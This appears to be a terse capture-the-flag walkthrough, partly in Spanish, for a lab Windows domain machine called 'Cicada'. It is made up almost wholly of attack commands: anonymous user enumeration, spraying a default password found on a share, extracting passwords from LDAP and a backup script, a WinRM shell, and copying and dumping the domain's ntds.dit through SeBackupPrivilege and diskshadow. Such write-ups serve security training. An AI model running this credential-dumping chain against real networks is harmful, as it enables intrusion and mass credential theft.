---
title: "Cicada"
---

# Cicada

```bash
impacket-lookupsid anonymous@cicada.htb -target-ip 10.10.11.35 -no-pass | grep SidTypeUser | tr '\\' ' ' | awk '{print $3}' > validUsers.txt
```

```bash
smbclient //10.10.11.35/HR -N
get "Notice from HR.txt"
```

`Default pass`
```
Cicada$M6Corpb*@Lp#nZp!8
```

```bash
netexec smb 10.10.11.35 -u validUsers.txt  -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
michael.wrightson \ Cicada$M6Corpb*@Lp#nZp!8 
```

```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```

La descripción de David Orelious contiene su pass

```
david.orelious \ aRt$Lp#7t*VQ!3
```

```bash
smbclient //10.10.11.35/DEV -U david.orelious%'aRt$Lp#7t*VQ!3'

get Backup_script.ps1
```

```
emily.oscars \ Q!3@Lp#M6b*7t*Vt
```

```bash
netexec winrm 10.10.11.35 -u 'emily.oscars'  -p 'Q!3@Lp#M6b*7t*Vt'
```

```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars'  -p 'Q!3@Lp#M6b*7t*Vt'
```

# SeBackupPrivilege/SeRestorePrivilege


`raj.dsh`
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

```bash
unix2dos raj.dsh
```

```bash
upload raj.dsh
```

```bash
cd $env:TEMP
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

```bash
reg save hklm\system C:\Users\emily.oscars.CICADA\AppData\Local\Temp\system.hive
```

```
download system.hive
download ntds.dit
```

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive local
```
